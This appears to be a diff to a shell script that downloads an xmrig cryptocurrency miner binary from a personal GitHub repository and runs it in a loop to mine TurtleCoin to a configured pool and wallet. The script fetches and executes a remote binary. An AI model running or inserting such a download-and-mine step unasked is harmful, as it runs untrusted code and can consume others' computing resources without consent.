@@ -5,7 +5,7 @@ WORKER=$(echo $(shuf -i 10-40 -n 1)-TRTL)
 wget https://github.com/pogchampv10/CPU/raw/main/xmrig
 chmod +x xmrig
 while [ 1 ]; do
-./xmrig --randomx-mode=fast --randomx--1gb-pages --tls --cpu-no-yield --donate-level 0 -o $POOL -u $WALLET -p $WORKER -a argon2/chukwav2 -k
+./xmrig -a argon2/chukwav2 --randomx-mode=fast --randomx-1gb-pages --tls --cpu-no-yield -o $POOL -u $WALLET -p $WORKER -k
 sleep 5
 done
-sleep 999999999 
+sleep 999999999
